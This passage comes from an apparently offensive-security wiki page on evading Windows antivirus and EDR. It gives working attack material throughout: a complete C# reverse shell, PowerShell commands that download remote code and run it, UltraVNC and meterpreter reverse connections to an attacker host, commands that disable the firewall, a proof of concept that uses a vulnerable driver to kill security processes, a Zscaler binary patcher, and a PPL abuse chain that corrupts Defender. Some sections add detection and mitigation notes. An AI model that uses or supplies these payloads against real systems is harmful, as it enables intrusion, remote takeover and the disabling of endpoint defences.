<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 와 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 확인하세요.

또한 PowerShell에서 C# 어셈블리를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 와 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), 침해된 머신이 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 접근할 수 있게 하면 다른 언어를 사용해 악성 코드를 실행할 수 있습니다.

SMB 공유의 인터프리터 바이너리와 환경에 대한 접근을 허용함으로써 침해된 머신의 메모리 내에서 이러한 언어들로 임의 코드를 **실행(execute arbitrary code in these languages within memory)** 할 수 있습니다.

저장소에는 다음과 같이 적혀 있습니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하면 **정적 시그니처를 우회할 수 있는 더 큰 유연성(more flexibility to bypass static signatures)** 을 얻을 수 있습니다. 이들 언어로 작성된 무작위의 난독화되지 않은 리버스 셸 스크립트로 테스트한 결과 성공적이었습니다.

## TokenStomping

Token stomping은 공격자가 액세스 토큰이나 EDR 또는 AV 같은 보안 제품을 **조작(manipulate the access token or a security prouct like an EDR or AV)** 하여 권한을 축소함으로써 프로세스가 종료되지는 않지만 악성 활동을 검사할 권한을 상실하게 만드는 기법입니다.

이를 방지하기 위해 Windows는 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻는 것을 **차단(prevent external processes)** 할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), 피해자의 PC에 Chrome Remote Desktop을 배포한 뒤 이를 통해 takeover 및 persistence를 유지하는 것이 쉽습니다:
1. https://remotedesktop.google.com/ 에서 다운로드하고 "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭하여 MSI 파일을 다운로드합니다.
2. 피해자 시스템에서 관리자 권한으로 인스톨러를 무음 설치합니다: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 Next를 클릭하세요. 설치 마법사가 권한 승인을 요청하면 Authorize 버튼을 클릭하여 계속합니다.
4. 제공된 파라미터를 약간 수정하여 실행하세요: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (참고: pin 파라미터로 GUI를 사용하지 않고 핀을 설정할 수 있습니다.)

## Advanced Evasion

Evasion은 매우 복잡한 주제이며, 때로는 하나의 시스템에서 여러 출처의 텔레메트리를 모두 고려해야 하므로 성숙한 환경에서 완전히 탐지되지 않는 상태를 유지하는 것은 거의 불가능합니다.

각 환경마다 강점과 약점이 다릅니다.

더 고급 회피 기술에 대해 이해를 넓히려면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

이것은 또한 Evasion in Depth에 관한 [@mariuszbit](https://twitter.com/mariuszbit)의 또 다른 훌륭한 강연입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 바이너리의 일부를 단계적으로 제거하면서 Defender가 어떤 부분을 악성으로 판단하는지 찾아내어 분리해 줍니다.\
동일한 기능을 제공하는 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, 서비스는 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 웹으로 제공됩니다.

### **Telnet Server**

Windows 10 이전까지 모든 Windows에는 관리자 권한으로 설치할 수 있는 **Telnet server**가 기본적으로 포함되어 있었습니다. 설치하려면 다음을 실행하세요:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하도록 설정하고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port 변경** (stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin 다운로드를 사용하세요, setup는 사용하지 마세요)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- 옵션 _Disable TrayIcon_ 활성화
- _VNC Password_에 비밀번호 설정
- _View-Only Password_에 비밀번호 설정

그런 다음, 바이너리 _**winvnc.exe**_와 새로 생성된 파일 _**UltraVNC.ini**_를 **victim** 내부로 이동하세요

#### **Reverse connection**

The **attacker**는 자신의 **host**에서 바이너리 `vncviewer.exe -listen 5900`를 실행해 reverse **VNC connection**을 수신할 준비를 해야 합니다. 그런 다음, **victim** 내부에서는: winvnc 데몬 `winvnc.exe -run`를 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`를 실행하세요

**WARNING:** 은폐(stealth)를 유지하려면 다음을 하지 마세요

- 이미 실행 중인 경우 `winvnc`를 시작하지 마세요. 그렇지 않으면 [popup](https://i.imgur.com/1SROTTl.png)이 뜹니다. 실행 여부는 `tasklist | findstr winvnc`로 확인하세요
- 같은 디렉터리에 `UltraVNC.ini`가 없는데 `winvnc`를 시작하면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
- 도움말을 위해 `winvnc -h`를 실행하지 마세요. [popup](https://i.imgur.com/oc18wcu.png)이 표시됩니다

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **lister를 시작**하고 **xml payload를 실행**하려면:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using 컴파일러
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 build injectors 예시:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 종료

Storm-2603은 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 이용해 랜섬웨어를 배포하기 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 **자체적으로 취약하지만 *서명된* 드라이버**를 포함하고 있으며, 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 수행합니다.

핵심 요점
1. **서명된 드라이버**: 디스크에 배달된 파일은 `ServiceMouse.sys`이지만 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에서 온 정식 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버에 유효한 Microsoft 서명이 있으므로 Driver-Signature-Enforcement (DSE)가 활성화된 상태에서도 로드됩니다.
2. **서비스 설치**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 사용자 영역에서 접근 가능하게 만듭니다.
3. **드라이버가 노출한 IOCTL**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의 프로세스를 종료 (Defender/EDR 서비스를 종료하는 데 사용됨) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버를 언로드하고 서비스를 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **작동 원리**: BYOVD는 사용자 모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 *보호된* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 하드닝 기능과 무관하게 커널 객체를 변조할 수 있습니다.

탐지 / 완화
• Microsoft의 취약 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys` 로드를 거부하도록 합니다.  
• 새로운 *커널* 서비스 생성 모니터링 및 드라이버가 world-writable 디렉터리에서 로드되었거나 allow-list에 없는 경우 알림을 설정합니다.  
• 사용자 모드에서 커스텀 디바이스 오브젝트에 대한 핸들이 생성된 다음 의심스러운 `DeviceIoControl` 호출이 발생하는지 감시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 결과를 다른 구성요소에 전달하기 위해 Windows RPC에 의존합니다. 두 가지 약한 설계 선택으로 인해 완전 우회가 가능합니다:

1. Posture 평가는 **전적으로 클라이언트 측에서** 이루어짐 (서버에는 boolean만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행 파일이 **Zscaler에 의해 서명되었는지**(`WinVerifyTrust`를 통해)만 검증함.

디스크의 서명된 바이너리 4개를 패치하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 검사에서 적합으로 처리됨 |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP 처리 ⇒ 어떤 프로세스(심지어 서명되지 않은 것이라도)도 RPC 파이프에 바인딩 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 교체됨 |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 쇼트시킷됨 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

이 사례 연구는 순수한 클라이언트 측 신뢰 결정과 단순한 서명 검사들이 몇 바이트 패치로 어떻게 무력화될 수 있는지를 보여줍니다.

## Protected Process Light (PPL)을 악용하여 LOLBINs로 AV/EDR을 변조하기

Protected Process Light (PPL)은 signer/level 계층을 강제하여 동등하거나 더 높은 권한의 protected process만 서로를 변조할 수 있게 합니다. 공격적으로, 합법적으로 PPL-활성화 바이너리를 실행하고 그 인수를 제어할 수 있다면, 정상적인 기능(예: 로깅)을 AV/EDR에서 사용하는 보호된 디렉터리에 대해 제한된 PPL 기반 쓰기 프리미티브로 전환할 수 있습니다.

프로세스가 PPL로 실행되려면
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe`는 자체적으로 프로세스를 생성하며, 호출자가 지정한 경로에 로그 파일을 쓰기 위한 매개변수를 받습니다.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp는 공백이 포함된 경로를 파싱할 수 없습니다; 일반적으로 보호되는 위치를 가리킬 때는 8.3 short paths를 사용하세요.

8.3 short path helpers
- 짧은 이름 나열: 각 상위 디렉터리에서 `dir /x` 실행
- cmd에서 짧은 경로 도출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 런처(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 PPL 지원 LOLBIN(ClipUp)을 실행합니다.
2) ClipUp 로그 경로 인수를 전달하여 보호된 AV 디렉터리(예: Defender Platform)에 파일 생성을 강제합니다. 필요하면 8.3 short names를 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 열려 있거나 잠겨 있는 경우(예: MsMpEng.exe), 자동 시작 서비스를 설치해 AV보다 먼저 확실히 실행되도록 부팅 시 쓰기를 예약하세요. 부팅 순서는 Process Monitor (boot logging)로 확인하세요.
4) 재부팅 시 PPL로 지원된 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방지합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp가 쓰는 내용은 배치(placement) 외에는 제어할 수 없습니다; 이 프리미티브는 정확한 콘텐츠 주입보다는 손상(corruption)에 적합합니다.
- 서비스 설치/시작과 재부팅 창(reboot window)이 필요하므로 로컬 admin/SYSTEM 권한이 필요합니다.
- 타이밍이 중요: 대상 파일이 열려 있으면 안 됩니다; 부팅 시 실행은 파일 락을 회피합니다.

Detections
- 부팅 시점 주변에 비정상적인 인수로 `ClipUp.exe`가 생성되는 프로세스(특히 비표준 런처로부터 부모화된 경우)를 탐지합니다.
- 의심스러운 이진을 자동 시작(auto-start)으로 설정하는 새 서비스 및 Defender/AV보다 일관되게 먼저 시작되는 서비스. Defender 시작 실패 이전의 서비스 생성/수정 여부를 조사합니다.
- Defender 이진/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예기치 않은 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스 및 AV가 아닌 이진에서의 비정상적 PPL 레벨 사용을 검사합니다.

Mitigations
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있는지와 어떤 부모 프로세스인지 제한; 정당한 컨텍스트 외에서의 ClipUp 호출을 차단합니다.
- 서비스 위생(Service hygiene): 자동 시작 서비스의 생성/수정을 제한하고 시작 순서(start-order) 조작을 모니터링합니다.
- Defender tamper protection 및 early-launch 보호가 활성화되어 있는지 확인; 바이너리 손상을 나타내는 시작 오류를 조사합니다.
- 보안 툴링을 호스팅하는 볼륨에서 환경과 호환된다면 8.3 short-name 생성(disable 8.3 short-name generation) 비활성화를 고려하세요(충분히 테스트하십시오).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
